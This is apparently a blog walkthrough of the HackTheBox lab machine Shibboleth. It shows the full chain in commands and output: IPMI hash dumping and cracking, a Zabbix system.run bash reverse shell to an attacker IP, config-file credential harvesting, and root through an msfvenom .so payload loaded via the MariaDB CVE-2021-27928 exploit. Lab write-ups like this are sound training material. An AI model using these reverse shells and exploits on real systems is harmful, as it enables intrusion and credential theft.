---
title: "Walk-through of Shibboleth from HackTheBox"
header:
  teaser: /assets/images/2021-12-08-21-47-27.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Zabbix
  - IPMI
  - CVE-2013-4784
  - JohnTheRipper
  - MSFVenom
  - CVE-2021-27928
---

## Machine Information

![shibboleth](/assets/images/2021-12-08-21-47-27.png)

Shibboleth is a medium machine on HackTheBox. After some initial enumeration we find a login page for an installation of Zabbix. Using Metasploit we dump user hashes that are easily cracked by JohnTheRipper. With access to the Zabbix dashboard we find it's vulnerable to remote code execution. We use this to gain a shell, and on the box we discover a vulnerable version of MariaDB. We use a public exploit to upload a payload which gives us a root shell to complete the box.

<!--more-->

Skills required are knowledge of enumeration techniques and researching public exploits. Skills learned are using Metasploit for exploitation and payload creation.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Shibboleth](https://www.hackthebox.com/home/machines/profile/410) |
| Machine Release Date | 13th November 2021 |
| Date I Completed It | 28th November 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/shibboleth]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.124 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/shibboleth]
└─# nmap -p$ports -sC -sV -oA shibboleth 10.10.11.124
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 11:47 GMT
Nmap scan report for 10.10.11.124
Host is up (0.026s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb
```

Interesting. We only have one open port on this box using TCP, if we get nowhere here then remember to scan again for UDP. Yes, I've been caught out by that before so now it's part of the process!

We see the hostname so let's add it to our hosts file before we start:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# echo "10.10.11.124 shibboleth.htb" >> /etc/hosts
```

Let's have a look at the website on port 80:

![shibboleth-web](/assets/images/2021-12-08-21-50-32.png)

Looking around the site it's mostly a template with nothing of any real interest. The only thing of note is on the footer:

![shibboleth-footer](/assets/images/2021-12-08-21-50-58.png)

## Gobuster

With nothing much to go on I tried subdomain enumeration:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# gobuster vhost -t 100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://shibboleth.htb -o results.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shibboleth.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/11/28 12:00:54 Starting gobuster in VHOST enumeration mode
===============================================================
Found: helpdesk.shibboleth.htb (Status: 302) [Size: 295]
Found: images.shibboleth.htb (Status: 302) [Size: 293]
Found: mx.shibboleth.htb (Status: 302) [Size: 289]
Found: shop.shibboleth.htb (Status: 302) [Size: 291]
Found: office.shibboleth.htb (Status: 302) [Size: 293]
Found: ns.shibboleth.htb (Status: 302) [Size: 289]
Found: owa.shibboleth.htb (Status: 302) [Size: 290]
Found: dns3.shibboleth.htb (Status: 302) [Size: 291]
<SNIP>
Found: access11.shibboleth.htb (Status: 302) [Size: 295]
Found: sugiyama1.shibboleth.htb (Status: 302) [Size: 296]
Found: email5.shibboleth.htb (Status: 302) [Size: 293]
===============================================================
2021/11/28 12:05:34 Finished
===============================================================
```

I should switch to fuff or wfuzz for vhost searching, anyway there's a long list to go through so just grep it for a status code we're interested in:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# cat results.txt | grep "Status: 20"
Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]
Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]
Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]
```

We find three subdomains, one called zabbix which was mentioned on that web page footer. Let's add them all to our hosts file:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# echo "10.10.11.124 monitoring.shibboleth.htb zabbix.shibboleth.htb monitor.shibboleth.htb" >> /etc/hosts
```

## Zabbix Login Page

Looking in the browser we find all three point to the same login page:

![shibboleth-login](/assets/images/2021-12-08-21-51-24.png)

I've not heard of Zabbix before. A look around found the official site [here](https://www.zabbix.com/), and a wiki page [here](https://en.wikipedia.org/wiki/Zabbix) where it describes it as:

```text
Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines (VMs) and cloud services.
```

## IPMI Investigation

Default credentials didn't work on the login page so back to nmap:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# nmap -sU --min-rate=1000 -T4 10.10.11.124
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 12:36 GMT
Warning: 10.10.11.124 giving up on port because retransmission cap hit (6).
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.026s latency).
Not shown: 986 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
17/udp    closed qotd
623/udp   open   asf-rmcp
<SNIP>
Nmap done: 1 IP address (1 host up) scanned in 7.76 seconds
```

As expected there's a UDP port open and 623 is a well known one for IPMI management. There's a good description [here](https://www.zenlayer.com/blog/what-is-ipmi/) if you're not familiar with it. Looking to HackTricks there is [this](https://book.hacktricks.xyz/pentesting/623-udp-ipmi) article we can use to enumerate the port.

First let's see what version of IPMI is running:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# nmap -sU --script ipmi-version -p 623 shibboleth.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 17:10 GMT
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.021s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null_user
|_  Level: 1.5, 2.0
```

Version 2 of IPMI has some serious security issues, [this](http://fish2.com/ipmi/remote-pw-cracking.html) is a good read where it explains that we can bypass authentication.

We can check for the cipher 0 exploit by using [this](https://github.com/alexoslabs/ipmitest) script:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# wget https://raw.githubusercontent.com/alexoslabs/ipmitest/master/ipmitest.sh
--2021-11-28 17:15:57--  https://raw.githubusercontent.com/alexoslabs/ipmitest/master/ipmitest.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2850 (2.8K) [text/plain]
Saving to: ‘ipmitest.sh’
ipmitest.sh     100%[======================================================================>]   2.78K  --.-KB/s    in 0s
2021-11-28 17:15:57 (66.3 MB/s) - ‘ipmitest.sh’ saved [2850/2850]
```

Now just run it against the box:

```text
┌──(root💀kali)-[~/htb/shibboleth]
└─# bash ./ipmitest.sh shibboleth.htb
'####:'########::'##::::'##:'####:'########:'########::'######::'########:
. ##:: ##.... ##: ###::'###:. ##::... ##..:: ##.....::'##... ##:... ##..::
: ##:: ##:::: ##: ####'####:: ##::::: ##:::: ##::::::: ##:::..::::: ##::::
: ##:: ########:: ## ### ##:: ##::::: ##:::: ######:::. ######::::: ##::::
: ##:: ##.....::: ##. #: ##:: ##::::: ##:::: ##...:::::..... ##:::: ##::::
: ##:: ##:::::::: ##:.:: ##:: ##::::: ##:::: ##:::::::'##::: ##:::: ##::::
'####: ##:::::::: ##:::: ##:'####:::: ##:::: ########:. ######::::: ##::::
..:::::::::..:::::..::....:::::..:::::........:::......::::::..:::::
V.(0.2) by Alexos Core Labs
[*] Testing dependencies...
[*] ipmitool version 1.8.18 installed...
[*] Analyzing IPMI on shibboleth.htb...
[*] Creating Log Directory...
[*] Testing for Zero Cipher(CVE-2013-4784)...
privilege level               : ADMINISTRATOR
[*] done
```

## Metasploit

With the host confirmed to be vulnerable we can turn to [this](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/) Rapid7 post on using Metasploit to dump user hashes:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# msfdb start
[+] Starting database

┌──(root💀kali)-[~/htb/shibboleth]
└─# msfconsole -nqx "use scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.10.11.124; set RPORT 623; set OUTPUT_JOHN_FILE out.john; exploit"
RHOSTS => 10.10.11.124
RPORT => 623
OUTPUT_JOHN_FILE => out.john
[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:86466b970223000067982d8966a40875c1ece9a0799cef734640ca4dfe646e76990b8a3b7e28ac51a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:f3006eb7f7bf3fcdf9a253ba31144abb49b65e77
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## JohnTheRipper

We have the Administrators hash and output it to JohnTheRipper format, let's crack it:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt out.john
Using default input encoding: UTF-8
Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepumkinpie1  (10.10.11.124 Administrator)
1g 0:00:00:01 DONE (2021-11-28 17:43) 0.8928g/s 6670Kp/s 6670Kc/s 6670KC/s in_199..iargxe
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Zabbix Dashboard

Within a few seconds we have our password. Now we can log in to the Zabbix dashboard:

![shibboleth-dashboard](/assets/images/2021-12-08-21-51-55.png)

Looking around the dashboard there isn't a lot setup, but searching for an exploit I found a simple method to get command execution in the Zabbix docs [here](https://www.zabbix.com/documentation/current/manual/config/items/itemtypes/zabbix_agent):

```text
system.run[command,<mode>]
Run specified command on the host.
command - command for execution
mode - possible values:
wait - wait end of execution (default),
nowait - do not wait

Example:
⇒ system.run[ls -l /] → detailed file list of root directory.
```

To take advantage of this we need to add a new item to the server with a schedule of when it's run. First click on Configuration, then hosts, then items:

![shibboleth-hosts](/assets/images/2021-12-08-21-52-43.png)

## Reverse Shell

Click on the Create Item button on the far right, then use this simple bash reverse shell as the command we'll run:

```sh
system.run[/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.62/1337 0>&1',nowait]
```

Give your item a name and paste our command in to the key field:

![shibboleth-items](/assets/images/2021-12-08-21-53-03.png)

Now start a netcat listening and wait for the shell to connect:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.62] from (UNKNOWN) [10.10.11.124] 44692
bash: cannot set terminal process group (1132): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@shibboleth:/$
```

First let's get a proper shell:

```sh
zabbix@shibboleth:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
zabbix@shibboleth:/$ ^Z
zsh: suspended  nc -nlvp 1337
┌──(root💀kali)-[~/htb/shibboleth]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 1337
zabbix@shibboleth:/$ stty rows 61 cols 237
```

Now check out who we are:

```text
zabbix@shibboleth:/$ whoami
zabbix
zabbix@shibboleth:/$ id
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
zabbix@shibboleth:/$ cat /etc/passwd | grep zabbix
zabbix:x:110:118::/var/lib/zabbix/:/usr/sbin/nologin
```

So we're connected as service account that can't login. Looking in /home we see there's just one user:

```text
zabbix@shibboleth:/$ ls -ls /home
4 drwxr-xr-x 4 ipmi-svc ipmi-svc 4096 Nov 28 16:35 ipmi-svc
```

## User Flag

Trying the same password that we used to log in to the dashboard works:

```text
zabbix@shibboleth:/$ su ipmi-svc
Password:
ipmi-svc@shibboleth:/$
```

Now we can grab the user flag:

```text
ipmi-svc@shibboleth:~$ cat user.txt
e90fa80a610ef639e26119e93a143a50
```

I found mysql running on the box as root:

```text

ipmi-svc@shibboleth:~$ ps -ef | grep mysql
root       92419       1  0 19:10 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root       92542   92419  0 19:10 ?        00:00:52 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock
root       92543   92419  0 19:10 ?        00:00:00 logger -t mysqld -p daemon error
ipmi-svc  124084  122951  0 22:07 pts/0    00:00:00 grep --color=auto mysql
```

Also found it listening locally on the default port of 3306:

```text
ipmi-svc@shibboleth:~$ netstat -ano | grep 3306
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
```

Looking around I found the zabbix installation in /etc with a server config file in there containing credentials:

```text
ipmi-svc@shibboleth:~$ cat /etc/zabbix/zabbix_server.conf | grep 'DBName\|DBUser\|DBPassword'
### Option: DBName
# DBName=
DBName=zabbix
### Option: DBUser
# DBUser=
DBUser=zabbix
### Option: DBPassword
DBPassword=bloooarskybluh
```

## Mysql

We can log in to mysql now:

```text
ipmi-svc@shibboleth:~$ mysql -u zabbix -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2172
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]>
```

We see we have MariaDB which is a fork of mysql, more info [here](https://en.wikipedia.org/wiki/MariaDB). Searching for version 10.3.25 of MariaDB we find it's from 2020 and suffers from a command execution vulnerability. [CVE-2021-27928](https://www.cvedetails.com/cve/CVE-2021-27928) which can be exploited easily. [This](https://github.com/Al1ex/CVE-2021-27928) GitHub repo and [this](https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html) post have all the information we need to take advantage.

## MSFVenom Payload

First create our exploit with MSFVenom:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.62 LPORT=4444 -f elf-so -o pencer.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: pencer.so
```

Start a web server on Kali so we can grab the file:

```sh
┌──(root💀kali)-[~/htb/shibboleth]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Pull it across:

```text
ipmi-svc@shibboleth:/dev/shm$ wget http://10.10.14.62/pencer.so
--2021-11-28 22:47:14--  http://10.10.14.62/pencer.so
Connecting to 10.10.14.62:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 476 [application/octet-stream]
Saving to: ‘pencer.so’
pencer.so          100%[===========>]     476  --.-KB/s    in 0s
2021-11-28 22:47:14 (81.9 MB/s) - ‘pencer.so’ saved [476/476]
```

## Privilege Escalation

Start a netcat listener on Kali, and then execute the exploit on the box using mysql:

```text
ipmi-svc@shibboleth:/dev/shm$ mysql -u zabbix -p -e 'SET GLOBAL wsrep_provider="/dev/shm/CVE-2021-27928.so";'
Enter password:
ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query
```

## Root Flag

Switch back to Kali to see we have a root shell. Let's grab the flag:

```text
┌──(root💀kali)-[~/htb/shibboleth]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.62] from (UNKNOWN) [10.10.11.124] 33088
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
064275d7a96d3f300917a45b59bf97b6
```

All done. See you next time.
